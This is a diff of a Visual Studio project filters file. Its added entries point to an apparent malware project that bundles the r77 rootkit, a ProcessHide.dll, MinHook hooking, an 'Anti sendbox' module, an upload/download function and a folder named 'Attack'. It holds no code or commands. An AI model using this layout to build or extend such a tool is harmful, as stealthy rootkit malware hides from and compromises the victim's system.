@@ -25,6 +25,24 @@
     <Filter Include="源文件\主模块">
       <UniqueIdentifier>{f9bcb4cd-bd42-4f74-9dcf-22a0cb070683}</UniqueIdentifier>
     </Filter>
+    <Filter Include="头文件\hie task Process">
+      <UniqueIdentifier>{92142823-e8a6-406b-921a-4a2251b10608}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="资源文件\hid Task Process">
+      <UniqueIdentifier>{c31c4ef1-0f7e-4bbb-a669-af18ebf1c436}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="资源文件\Attack">
+      <UniqueIdentifier>{b6f6cc4a-faa0-47d8-83e9-55bfb9c89976}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\hide System Project">
+      <UniqueIdentifier>{dab5732c-cb23-459a-ac1c-43cf39f7a063}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="头文件\hide System Project">
+      <UniqueIdentifier>{0f471f85-b41f-4d73-ad1d-3b304e8f80bb}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="资源文件\hide System Porject">
+      <UniqueIdentifier>{6dc04036-afd0-40a0-8c83-5129f22144dc}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="Anti sendbox.cpp">
@@ -51,6 +69,15 @@
     <ClCompile Include="uoload_or_download-function.cpp">
       <Filter>源文件\函数模块</Filter>
     </ClCompile>
+    <ClCompile Include="kernel.cpp">
+      <Filter>源文件\函数模块</Filter>
+    </ClCompile>
+    <ClCompile Include="hand file\r77\r77 hand\Install.cpp">
+      <Filter>源文件\函数模块\hide System Project</Filter>
+    </ClCompile>
+    <ClCompile Include="hand file\r77\r77 hand\r77api.cpp">
+      <Filter>源文件\函数模块\hide System Project</Filter>
+    </ClCompile>
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="API.h">
@@ -68,6 +95,18 @@
     <ClInclude Include="resource.h">
       <Filter>头文件</Filter>
     </ClInclude>
+    <ClInclude Include="resource\内核\MinHook.h">
+      <Filter>头文件\hie task Process</Filter>
+    </ClInclude>
+    <ClInclude Include="hand file\r77\r77 hand\Install.h">
+      <Filter>头文件\hide System Project</Filter>
+    </ClInclude>
+    <ClInclude Include="hand file\r77\r77 hand\ntdll.h">
+      <Filter>头文件\hide System Project</Filter>
+    </ClInclude>
+    <ClInclude Include="hand file\r77\r77 hand\r77api.h">
+      <Filter>头文件\hide System Project</Filter>
+    </ClInclude>
   </ItemGroup>
   <ItemGroup>
     <ResourceCompile Include="0x7E9FB-net.rc">
@@ -75,6 +114,19 @@
     </ResourceCompile>
   </ItemGroup>
   <ItemGroup>
-    <None Include="file\libuv.dll" />
+    <None Include="file\ProcessHide.dll">
+      <Filter>资源文件\hid Task Process</Filter>
+    </None>
+    <None Include="file\libuv.dll">
+      <Filter>资源文件\Attack</Filter>
+    </None>
+    <None Include="hand file\r77\exe file\InstallStager.exe">
+      <Filter>资源文件\hide System Porject</Filter>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="resource\内核\libMinHook.x64.lib">
+      <Filter>资源文件\hid Task Process</Filter>
+    </Library>
   </ItemGroup>
 </Project>
